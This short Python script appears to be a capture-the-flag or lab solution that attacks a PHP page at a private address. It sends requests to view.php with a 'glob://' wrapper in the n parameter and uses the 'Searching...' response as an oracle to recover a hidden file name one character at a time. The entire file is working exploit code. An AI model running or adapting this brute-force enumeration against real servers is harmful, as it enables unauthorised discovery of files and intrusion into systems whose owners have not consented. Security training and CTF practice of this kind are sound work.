import requests

table = '_0123456789abcdefghijklmnopqrstuvwxyz'
result = 'h'
while True:
	for ch in table:
		r = requests.get('http://192.168.101.202:62804/view.php?n=glob://{}*'.format(result + ch))

		if r.text.find('Searching...') != -1:
			result += ch
			print result
			break
	else:
		break